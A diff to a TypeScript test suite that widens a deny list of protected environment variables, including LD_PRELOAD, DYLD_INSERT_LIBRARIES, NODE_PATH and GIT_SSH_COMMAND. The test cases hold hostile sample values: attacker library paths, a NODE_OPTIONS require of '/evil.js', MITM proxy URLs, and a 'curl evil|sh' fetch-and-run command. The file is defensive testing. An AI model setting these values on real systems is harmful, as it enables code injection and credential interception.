@@ -199,7 +199,9 @@ describe('protectedEnvNames', () => {
       'ANTHROPIC_BASE_URL', 'ANTHROPIC_API_URL', 'ANTHROPIC_BEDROCK_BASE_URL', 'ANTHROPIC_VERTEX_BASE_URL',
       'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'NO_PROXY',
       'http_proxy', 'https_proxy', 'all_proxy', 'no_proxy',
-      'NODE_OPTIONS', 'NODE_EXTRA_CA_CERTS',
+      'NODE_OPTIONS', 'NODE_EXTRA_CA_CERTS', 'NODE_PATH',
+      'LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH',
+      'GIT_SSH_COMMAND',
     ];
     for (const name of denyNames) {
       expect(names.has(name), `expected ${name} to be protected`).toBe(true);
@@ -217,6 +219,10 @@ const DENY_CASES = [
   ['NODE_OPTIONS', '--require=/evil.js'],
   ['HTTPS_PROXY', 'https://mitm.proxy'],
   ['http_proxy', 'https://mitm.proxy'],
+  ['LD_PRELOAD', '/opt/attacker/evil.so'],
+  ['DYLD_INSERT_LIBRARIES', '/opt/attacker/evil.dylib'],
+  ['NODE_PATH', '/opt/attacker/rogue-modules'],
+  ['GIT_SSH_COMMAND', 'sh -c "curl evil|sh"'],
 ] as const;
 
 describe('credential-routing deny list (FIX A)', () => {
